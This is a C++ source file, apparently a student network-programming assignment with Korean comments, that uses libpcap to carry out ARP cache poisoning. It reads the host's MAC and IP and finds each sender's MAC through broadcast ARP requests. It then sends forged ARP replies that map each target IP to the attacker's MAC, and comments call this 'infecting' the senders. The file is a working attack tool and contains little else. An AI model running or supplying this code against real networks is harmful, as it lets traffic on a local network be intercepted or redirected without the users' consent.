#include "ethhdr.h"
#include "arphdr.h"
#include <pcap.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <utility>
#include <bits/stdc++.h>
#include <arpa/inet.h>
#include <net/if.h> // ifreq

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

using namespace std;

struct FLOW {
    Mac MAC;
    Ip IP;
};

Mac my_mac;
Ip my_ip;

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

vector<pair<FLOW, Ip>> FLOWS;

EthArpPacket make_packet(Mac ether_smac, Mac ether_dmac, uint16_t op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = ether_dmac;
    packet.eth_.smac_ = ether_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op); // request = 1 or reply = 2
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(arp_tip);

    return packet;
}

int main(int argc, char* argv[]) {
    if (argc < 4) { // 실행에 필요한 최소 인자...
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        return -1;
    }

    for (int i = 2; i < argc; i+=2) {
        pair<FLOW, Ip> p;
        FLOW sender;
        sender.IP = Ip(argv[i]);
        p.second = Ip(argv[i + 1]);
        p.first = sender;
        FLOWS.push_back(p);
    }

    for (int i = 0; i < FLOWS.size(); i++) {
        printf("%d %d\n", FLOWS[i].first, FLOWS[i].second);
    }

    // 인자로 들어오는 모든 (sender ip, target ip)를 감염시켜야 함...
    // 일단 공격하려면 my mac, my ip, sender mac, sender ip를 알아야 함.
    // for문으로 모든 정보를 다 얻자.

    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strcpy(ifr.ifr_name, dev);
    ioctl(fd, SIOCGIFHWADDR, &ifr);

    my_mac = Mac(ifr.ifr_hwaddr);
    my_ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));

    // 각각의 pair에 있는 sender들의 Mac 주소 얻기...
    for (int i = 0; i < FLOWS.size(); i++) {
        Mac sender_mac;
        EthArpPacket arp_packet = make_packet(
            my_mac,
            Mac("ff:ff:ff:ff:ff:ff"), // Broadcast
            1, // request
            my_mac,
            my_ip,
            Mac("ff:ff:ff:ff:ff:ff"),
            FLOWS[i].first.IP
        );

        while (1) {
            int res = pcap_sendpacket(
                handle,
                reinterpret_cast<const u_char*>(&arp_packet),
                sizeof(EthArpPacket)
            );

            struct pcap_pkthdr* header;
            const u_char* raw_packet;
            res = pcap_next_ex(handle, &header, &raw_packet);

            EthArpPacket packet;
            memcpy(&packet, raw_packet, sizeof(EthArpPacket));
            if (ntohs(packet.arp_.op_) == ArpHdr::Reply) {
                sender_mac = packet.arp_.smac_;
                break;
            }
        }
        FLOWS[i].first.MAC = sender_mac;
    }

    // 모든 flow에 대한 정보를 얻었다면... 반복문으로 공격 패킷을 보내자...
    for (int i = 0; i < FLOWS.size(); i++) {
        EthArpPacket attack_packet = make_packet(
            my_mac,
            FLOWS[i].first.MAC,
            2, // reply
            my_mac,
            FLOWS[i].second,
            FLOWS[i].first.MAC,
            FLOWS[i].first.IP
        );

        int res = pcap_sendpacket(
                handle,
                reinterpret_cast<const u_char*>(&attack_packet),
                sizeof(EthArpPacket)
            );
        printf("Success!\n");
    }

    return 0;
}